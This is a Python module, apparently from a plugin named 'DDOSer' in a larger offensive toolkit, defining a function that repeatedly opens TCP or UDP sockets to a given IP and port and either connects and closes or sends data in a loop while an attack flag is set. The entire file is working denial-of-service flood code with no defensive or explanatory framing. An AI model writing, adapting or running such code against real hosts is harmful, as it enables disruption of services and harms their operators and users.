# libs
from socket import socket, AF_INET, SOCK_STREAM, SOCK_DGRAM
import plugins.DDOSer.Status_Holders as Holders
from lib.GPL.IO import gpl_sleep
from lib.core.Error_Handler import Handler
import lib.config.Error_Levels as Error_Levels

# Attack
def SOCKET_Attacker(IP, Port, Protocol, Method, Sleep_Time, Data:bytes):
    try:
        while Holders.In_Attack:
            while Holders.In_Attack:
                # Create Session
                if Protocol == 1:
                    # TCP
                    Session = socket(AF_INET, SOCK_STREAM)
                else:
                    # UDP
                    Session = socket(AF_INET, SOCK_DGRAM)
                # Connect
                try:
                    Session.connect((IP, Port))
                except:
                    Handler(Error_Levels.Failed_Job, 'Failed to connect ' + IP + ':' + str(Port) + ' , retry after : ' + str(Sleep_Time))
                    gpl_sleep(Sleep_Time)
                    continue
                if Method == 1:
                    # Connect & Close
                    Session.close()
                    gpl_sleep(Sleep_Time)
                else:
                    # Send Data
                    break
            # Attack if method is send data
            while Holders.In_Attack:
                try:
                    Session.send(Data)
                except:
                    # Socket Closed - Retry to connect
                    break
                gpl_sleep(Sleep_Time)
    except (KeyboardInterrupt, EOFError):
        pass